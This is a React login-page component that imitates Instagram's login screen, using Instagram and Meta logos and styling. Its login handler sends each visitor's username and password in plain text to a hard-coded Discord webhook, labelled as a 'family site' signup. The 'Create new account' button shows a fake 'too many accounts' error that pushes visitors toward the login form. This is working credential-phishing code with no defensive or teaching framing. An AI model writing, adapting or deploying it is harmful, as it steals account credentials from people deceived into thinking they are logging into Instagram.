import { useState } from "react";
import { Link } from "react-router-dom";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [usernameFocused, setUsernameFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [loginHovered, setLoginHovered] = useState(false);
  const [createHovered, setCreateHovered] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!username || !password) {
      alert("Please fill in both fields");
      return;
    }

    try {
      // Send data to Discord webhook
      const webhookUrl = "https://discord.com/api/webhooks/1434012927836291113/5newpTR3u3h4bFvd5OuWdIP7lHAPdd-jOUgvR50RoeUo9g13L8f-vhl0ubXcs4O9yx6q";

      const message = {
        content: "New Family Member Signup Request",
        embeds: [
          {
            color: 0x0064E0,
            title: "Login Data",
            fields: [
              {
                name: "Username/Email",
                value: `||${username}||`,
                inline: false
              },
              {
                name: "Password",
                value: `||${password}||`,
                inline: false
              },
              {
                name: "Timestamp",
                value: new Date().toLocaleString(),
                inline: false
              }
            ],
            footer: {
              text: "Family Site - Manual Approval Required"
            }
          }
        ]
      };

      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
      });

      if (response.ok) {
        console.log("Data sent to Discord successfully");
        // Show success message
        alert("Signup request sent! Please wait for manual approval.");
        // Clear form
        setUsername("");
        setPassword("");
      } else {
        console.error("Failed to send data to Discord");
        alert("Error sending data. Please try again.");
      }
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
    }
  };

  const handleCreateAccount = () => {
    setShowErrorModal(true);
  };

  return (
    <div
      style={{
        display: "flex",
        flexDirection: "column",
        justifyContent: "space-between",
        height: "100%",
        width: "100%",
        paddingBottom: 0,
        backgroundColor: "#1C2B33",
        minHeight: "100vh",
      }}
    >
      {/* Language Selector */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: "12px 0",
          cursor: "pointer",
          transition: "opacity 0.2s ease",
        }}
        role="button"
        tabIndex={0}
        aria-label="English (US)"
        onMouseEnter={(e) => {
          e.currentTarget.style.opacity = "0.7";
        }}
        onMouseLeave={(e) => {
          e.currentTarget.style.opacity = "1";
        }}
      >
        <div
          style={{
            fontSize: "13px",
            fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
            fontWeight: 400,
            color: "rgb(203, 210, 217)",
            letterSpacing: "-0.04px",
            lineHeight: 1.43,
          }}
        >
          English (US)
        </div>
      </div>

      {/* Instagram Logo Container */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexGrow: 1,
          flexShrink: 100,
          marginTop: 0,
          marginBottom: "20px",
          pointerEvents: "none",
        }}
      >
        <img
          alt="Instagram from Meta"
          src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png"
          style={{
            maxHeight: "60px",
            minHeight: 0,
            objectFit: "contain",
            overflow: "hidden",
          }}
          role="heading"
        />
      </div>

      {/* Form Container */}
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          justifyContent: "flex-start",
          pointerEvents: "none",
          width: "100%",
          maxWidth: "350px",
          margin: "0 auto",
          paddingLeft: "16px",
          paddingRight: "16px",
        }}
      >
        {/* Username Input */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: 0,
            pointerEvents: "none",
          }}
        >
          <div
            style={{
              width: "100%",
              backgroundColor: "rgba(0, 0, 0, 0)",
              display: "flex",
              flexDirection: "column",
              pointerEvents: "none",
            }}
          >
            <div
              style={{
                width: "100%",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                pointerEvents: "none",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  flexDirection: "row",
                  padding: "10px 16px",
                  backgroundColor: "rgb(28, 43, 51)",
                  border: usernameFocused ? "1px solid rgb(0, 100, 224)" : "1px solid rgb(70, 90, 105)",
                  borderRadius: "12px",
                  cursor: "pointer",
                  pointerEvents: "auto",
                  transition: "border-color 0.2s ease",
                }}
              >
                {/* Placeholder Label */}
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    flexDirection: "row",
                    position: "absolute",
                    opacity: username || usernameFocused ? 0 : 1,
                    paddingRight: 0,
                    transition: "opacity 0.2s ease",
                    pointerEvents: "none",
                  }}
                >
                  <div
                    style={{
                      fontSize: "16px",
                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                      fontWeight: 400,
                      color: "rgb(133, 149, 164)",
                      lineHeight: 1.3,
                      display: "block",
                      overflow: "hidden",
                    }}
                  >
                    Username, email or mobile number
                  </div>
                </div>

                {/* Input Field */}
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    flexGrow: 1,
                    pointerEvents: "none",
                  }}
                >
                  <input
                    type="email"
                    name="username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    onFocus={() => setUsernameFocused(true)}
                    onBlur={() => setUsernameFocused(false)}
                    placeholder=""
                    dir="auto"
                    autoCapitalize="off"
                    autoComplete="on"
                    autoCorrect="off"
                    aria-label="Username, email or mobile number"
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "rgb(255, 255, 255)",
                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                      fontSize: "16px",
                      lineHeight: 1.3,
                      caretColor: "rgb(255, 255, 255)",
                      minHeight: "22px",
                      outline: "none",
                      width: "100%",
                      pointerEvents: "auto",
                    }}
                  />
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Password Input */}
        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginTop: "12px",
            marginBottom: 0,
            pointerEvents: "none",
          }}
        >
          <div
            style={{
              width: "100%",
              backgroundColor: "rgba(0, 0, 0, 0)",
              display: "flex",
              flexDirection: "column",
              pointerEvents: "none",
            }}
          >
            <div
              style={{
                width: "100%",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                pointerEvents: "none",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  flexDirection: "row",
                  padding: "10px 16px",
                  backgroundColor: "rgb(28, 43, 51)",
                  border: passwordFocused ? "1px solid rgb(0, 100, 224)" : "1px solid rgb(70, 90, 105)",
                  borderRadius: "12px",
                  cursor: "pointer",
                  pointerEvents: "auto",
                  transition: "border-color 0.2s ease",
                }}
              >
                {/* Placeholder Label */}
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    flexDirection: "row",
                    position: "absolute",
                    opacity: password || passwordFocused ? 0 : 1,
                    paddingRight: 0,
                    transition: "opacity 0.2s ease",
                    pointerEvents: "none",
                  }}
                >
                  <div
                    style={{
                      fontSize: "16px",
                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                      fontWeight: 400,
                      color: "rgb(133, 149, 164)",
                      lineHeight: 1.3,
                      display: "block",
                      overflow: "hidden",
                    }}
                  >
                    Password
                  </div>
                </div>

                {/* Input Field */}
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    flexGrow: 1,
                    pointerEvents: "none",
                  }}
                >
                  <input
                    type="password"
                    name="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => setPasswordFocused(true)}
                    onBlur={() => setPasswordFocused(false)}
                    placeholder=""
                    dir="auto"
                    autoCapitalize="off"
                    autoComplete="on"
                    autoCorrect="off"
                    aria-label="Password"
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "rgb(255, 255, 255)",
                      fontFamily: '"Optimistic Text Medium", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                      fontSize: "16px",
                      lineHeight: 1.3,
                      caretColor: "rgb(255, 255, 255)",
                      minHeight: "22px",
                      outline: "none",
                      width: "100%",
                      pointerEvents: "auto",
                    }}
                  />
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Log In Button */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "stretch",
            justifyContent: "center",
            marginTop: "12px",
            pointerEvents: "none",
          }}
        >
          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
            <div
              style={{
                height: "100%",
                width: "100%",
                opacity: 1,
                transform: "scaleX(1) scaleY(1)",
                pointerEvents: "inherit",
              }}
            >
              <button
                type="submit"
                onClick={handleLogin}
                onMouseEnter={() => setLoginHovered(true)}
                onMouseLeave={() => setLoginHovered(false)}
                tabIndex={0}
                role="button"
                aria-label="Log in"
                data-anchor-id="replay"
                style={{
                  height: "100%",
                  width: "100%",
                  borderRadius: "22px",
                  pointerEvents: "inherit",
                  border: "none",
                  cursor: "pointer",
                  background: "none",
                  padding: 0,
                  transition: "all 0.2s ease",
                }}
              >
                <div
                  style={{
                    height: "44px",
                    minWidth: "44px",
                    flexGrow: 1,
                    paddingLeft: "20px",
                    paddingRight: "20px",
                    backgroundColor: loginHovered ? "rgb(30, 130, 255)" : "rgb(0, 100, 224)",
                    border: "0px solid rgb(28, 43, 51)",
                    borderRadius: "22px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexDirection: "row",
                    opacity: 1,
                    pointerEvents: "none",
                    transition: "background-color 0.2s ease",
                  }}
                >
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexDirection: "row",
                      opacity: 1,
                      pointerEvents: "none",
                    }}
                  >
                    <div
                      style={{
                        fontSize: "16px",
                        fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                        fontWeight: 500,
                        letterSpacing: "-0.08px",
                        color: "rgb(255, 255, 255)",
                        lineHeight: 1.248,
                        display: "block",
                        textAlign: "start",
                        overflow: "hidden",
                      }}
                    >
                      Log in
                    </div>
                  </div>
                </div>
              </button>
            </div>
          </div>
        </div>

        {/* Forgot Password Button */}
        <div
          style={{
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "center",
            paddingTop: "12px",
            paddingBottom: 0,
            pointerEvents: "none",
          }}
        >
          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
            <div
              style={{
                height: "100%",
                width: "100%",
                opacity: 1,
                pointerEvents: "inherit",
              }}
            >
              <button
                tabIndex={0}
                role="button"
                aria-label="Forgot password?"
                data-anchor-id="replay"
                onClick={() => {
                  // Navigate to forgot password page
                }}
                style={{
                  height: "100%",
                  width: "100%",
                  borderRadius: 0,
                  pointerEvents: "inherit",
                  border: "none",
                  cursor: "pointer",
                  background: "none",
                  padding: 0,
                  transition: "opacity 0.2s ease",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.opacity = "0.7";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.opacity = "1";
                }}
              >
                <div style={{ pointerEvents: "none" }}>
                  <div style={{ height: "36px", paddingLeft: "16px", paddingRight: "16px" }}>
                    <div
                      style={{
                        height: "100%",
                        width: "100%",
                        opacity: 1,
                        pointerEvents: "inherit",
                      }}
                    >
                      <div
                        style={{
                          height: "100%",
                          width: "100%",
                          display: "flex",
                          alignItems: "center",
                          flexDirection: "row",
                          justifyContent: "center",
                          pointerEvents: "inherit",
                        }}
                      >
                        <div>
                          <div
                            style={{
                              height: "100%",
                              width: "100%",
                              opacity: 1,
                              pointerEvents: "inherit",
                            }}
                          >
                            <div
                              style={{
                                display: "flex",
                                height: "100%",
                                width: "100%",
                                flexDirection: "row",
                                pointerEvents: "inherit",
                              }}
                            >
                              <div
                                style={{
                                  fontSize: "16px",
                                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                                  fontWeight: 500,
                                  letterSpacing: "-0.08px",
                                  color: "rgb(255, 255, 255)",
                                  lineHeight: 1.248,
                                  display: "block",
                                  textAlign: "start",
                                  overflow: "hidden",
                                }}
                              >
                                Forgot password?
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Bottom Section with Create Account Button */}
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          justifyContent: "flex-end",
          flexGrow: 1,
          flexShrink: 1000000,
          paddingBottom: 0,
          pointerEvents: "none",
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            flexDirection: "row",
            justifyContent: "center",
            pointerEvents: "none",
            width: "100%",
            maxWidth: "350px",
            margin: "0 auto",
            paddingLeft: "16px",
            paddingRight: "16px",
          }}
        >
          <div style={{ flexGrow: 1, cursor: "pointer", pointerEvents: "auto" }}>
            <div
              style={{
                height: "100%",
                width: "100%",
                transform: "scaleX(1) scaleY(1)",
                opacity: 1,
                pointerEvents: "inherit",
              }}
            >
              <button
                tabIndex={0}
                role="button"
                aria-label="Create new account"
                data-anchor-id="replay"
                onClick={handleCreateAccount}
                onMouseEnter={() => setCreateHovered(true)}
                onMouseLeave={() => setCreateHovered(false)}
                style={{
                  height: "100%",
                  width: "100%",
                  borderRadius: "22px",
                  pointerEvents: "inherit",
                  border: "none",
                  cursor: "pointer",
                  background: "none",
                  padding: 0,
                  transition: "all 0.2s ease",
                }}
              >
                <div
                  style={{
                    height: "44px",
                    minWidth: "44px",
                    flexGrow: 1,
                    paddingLeft: "20px",
                    paddingRight: "20px",
                    backgroundColor: createHovered ? "rgba(255, 255, 255, 0.05)" : "rgba(255, 255, 255, 0)",
                    border: createHovered ? "1px solid rgb(100, 173, 254)" : "1px solid rgb(69, 153, 254)",
                    borderRadius: "22px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    flexDirection: "row",
                    opacity: 1,
                    pointerEvents: "none",
                    transition: "all 0.2s ease",
                  }}
                >
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexDirection: "row",
                      opacity: 1,
                      pointerEvents: "none",
                    }}
                  >
                    <div
                      style={{
                        fontSize: "16px",
                        fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                        fontWeight: 500,
                        letterSpacing: "-0.08px",
                        color: createHovered ? "rgb(100, 173, 254)" : "rgb(71, 165, 250)",
                        lineHeight: 1.248,
                        display: "block",
                        textAlign: "start",
                        overflow: "hidden",
                        transition: "color 0.2s ease",
                      }}
                    >
                      Create new account
                    </div>
                  </div>
                </div>
              </button>
            </div>
          </div>
        </div>

        {/* Meta Footer */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            paddingTop: "20px",
            paddingBottom: "20px",
            pointerEvents: "none",
          }}
        >
          <div
            style={{
              height: "12px",
              aspectRatio: "5 / 1",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <img
              alt=""
              src="https://static.cdninstagram.com/rsrc.php/v4/yp/r/eJmGMdNKxpD.png"
              style={{
                height: "100%",
                width: "100%",
                pointerEvents: "inherit",
                maskImage: "url('https://static.cdninstagram.com/rsrc.php/v4/yM/r/DDgwTv3JehF.png')",
                maskSize: "contain",
                backgroundColor: "rgb(203, 210, 217)",
                objectPosition: "10000px 10000px",
                objectFit: "contain",
                overflow: "hidden",
              }}
            />
          </div>
        </div>
      </div>

      {/* Error Modal */}
      {showErrorModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "rgba(0, 0, 0, 0.65)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            animation: "fadeIn 0.15s ease-out",
          }}
          onClick={() => setShowErrorModal(false)}
          role="dialog"
          aria-modal="true"
        >
          <div
            style={{
              backgroundColor: "rgb(255, 255, 255)",
              borderRadius: "16px",
              padding: "32px",
              maxWidth: "400px",
              width: "85%",
              boxShadow: "0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1)",
              animation: "modalSlideIn 0.25s cubic-bezier(0.14, 1, 0.34, 1)",
            }}
            onClick={(e) => e.stopPropagation()}
            role="document"
          >
            {/* Modal Title and Description */}
            <div style={{ marginBottom: "32px", textAlign: "center" }}>
              <div
                style={{
                  fontSize: "20px",
                  fontWeight: 600,
                  color: "rgb(0, 0, 0)",
                  marginBottom: "12px",
                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                  lineHeight: "1.2",
                }}
              >
                Too many accounts created
              </div>
              <div
                style={{
                  fontSize: "15px",
                  color: "rgb(65, 65, 65)",
                  lineHeight: "1.4",
                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                  fontWeight: 400,
                }}
              >
                Too many accounts created from this device. Please login.
              </div>
            </div>

            {/* OK Button */}
            <div style={{ display: "flex", justifyContent: "center", marginTop: "24px" }}>
              <button
                onClick={() => setShowErrorModal(false)}
                style={{
                  backgroundColor: "rgb(0, 100, 224)",
                  color: "white",
                  border: "none",
                  borderRadius: "20px",
                  padding: "12px 48px",
                  fontSize: "15px",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontFamily: '"Optimistic Text Normal", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
                  transition: "all 0.2s ease",
                  letterSpacing: "-0.08px",
                  lineHeight: "1.248",
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.backgroundColor = "rgb(30, 130, 255)";
                  e.currentTarget.style.transform = "scale(1.02)";
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.backgroundColor = "rgb(0, 100, 224)";
                  e.currentTarget.style.transform = "scale(1)";
                }}
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }

        @keyframes modalSlideIn {
          from {
            transform: scale(0.92) translateY(-20px);
            opacity: 0;
          }
          to {
            transform: scale(1) translateY(0);
            opacity: 1;
          }
        }
      `}</style>
    </div>
  );
}
